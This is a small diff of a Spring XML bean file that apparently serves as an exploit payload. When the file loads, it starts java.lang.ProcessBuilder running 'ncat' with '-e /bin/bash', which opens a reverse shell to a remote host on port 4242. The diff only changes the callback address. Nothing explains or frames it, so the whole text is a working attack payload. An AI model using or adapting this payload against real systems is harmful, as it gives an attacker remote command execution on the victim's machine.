@@ -2,7 +2,7 @@
   <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
     <constructor-arg>
       <list>
-        <value>ncat 10.0.0.1 4242</value>
+        <value>ncat 172.22.71.91 4242</value>
         <value>-e /bin/bash</value>
       </list>
     </constructor-arg>
